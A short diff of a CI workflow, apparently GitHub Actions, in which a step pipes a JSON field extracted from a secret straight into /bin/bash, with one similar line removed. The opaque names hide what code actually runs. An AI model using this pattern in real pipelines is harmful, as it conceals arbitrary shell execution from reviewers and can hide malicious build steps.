@@ -17,7 +17,6 @@ jobs:
           i6177: ${{ secrets.i6177 }}
         run: |
           printf '%s' "$i6177" | jq -r .ss17032 | /bin/bash
-          printf '%s' "$dlt048" | jq -r .zvm618 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
